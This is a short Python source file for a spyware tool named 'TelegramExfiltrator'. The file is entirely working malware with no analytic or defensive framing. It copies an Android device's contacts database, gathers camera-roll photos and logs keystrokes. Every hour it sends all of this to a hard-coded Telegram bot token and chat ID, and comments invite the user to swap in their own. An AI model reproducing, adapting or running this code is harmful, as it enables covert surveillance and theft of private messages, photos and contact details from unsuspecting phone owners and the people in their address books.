import os
import sqlite3
import shutil
import requests
import json
import time
from pynput import keyboard
from plyer import notification
from telegram import Bot
from telegram.error import TelegramError

class TelegramExfiltrator:
    def __init__(self):
        self.contact_list = []
        self.gallery = []
        self.keylogger = []
        self.telegram_bot_token = "8123912799:AAHPm2C8387nIsuiQsFH_uAoMs3hFunOsb0"  # Replace with your bot token
        self.telegram_chat_id = "5724536723"  # Replace with your chat ID
        self.bot = Bot(token=self.telegram_bot_token)

    def extract_contacts(self):
        contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if os.path.exists(contacts_path):
            shutil.copy(contacts_path, "contacts.db")
            conn = sqlite3.connect("contacts.db")
            cursor = conn.cursor()
            cursor.execute("SELECT display_name, data1 FROM contacts, data WHERE contacts._id = data.contact_id AND data.mimetype = 'vnd.android.cursor.item/phone_v2'")
            self.contact_list = cursor.fetchall()
            conn.close()
            os.remove("contacts.db")

    def extract_gallery(self):
        gallery_path = "/storage/emulated/0/DCIM/Camera"
        if os.path.exists(gallery_path):
            for root, dirs, files in os.walk(gallery_path):
                for file in files:
                    if file.endswith(('.jpg', '.jpeg', '.png')):
                        self.gallery.append(os.path.join(root, file))

    def keylogger_callback(self, key):
        try:
            self.keylogger.append(key.char)
        except AttributeError:
            self.keylogger.append(str(key))

    def start_keylogger(self):
        listener = keyboard.Listener(on_press=self.keylogger_callback)
        listener.start()

    def send_to_telegram(self):
        try:
            # Send contacts
            contacts_text = "\n".join([f"{name}: {phone}" for name, phone in self.contact_list])
            self.bot.send_message(chat_id=self.telegram_chat_id, text=f"Contacts:\n{contacts_text}")

            # Send keystrokes
            if self.keylogger:
                keylog_text = "".join(self.keylogger)
                self.bot.send_message(chat_id=self.telegram_chat_id, text=f"Keylogger:\n{keylog_text}")

            # Send gallery images
            for image_path in self.gallery:
                with open(image_path, 'rb') as photo:
                    self.bot.send_photo(chat_id=self.telegram_chat_id, photo=photo)

            notification.notify(
                title="Update",
                message="Data sent to Telegram successfully.",
                timeout=10
            )
        except TelegramError as e:
            print(f"Telegram Error: {e}")

    def run(self):
        self.extract_contacts()
        self.extract_gallery()
        self.start_keylogger()
        while True:
            time.sleep(3600)  # Send data every hour
            self.send_to_telegram()

if __name__ == "__main__":
    exfiltrator = TelegramExfiltrator()
    exfiltrator.run()
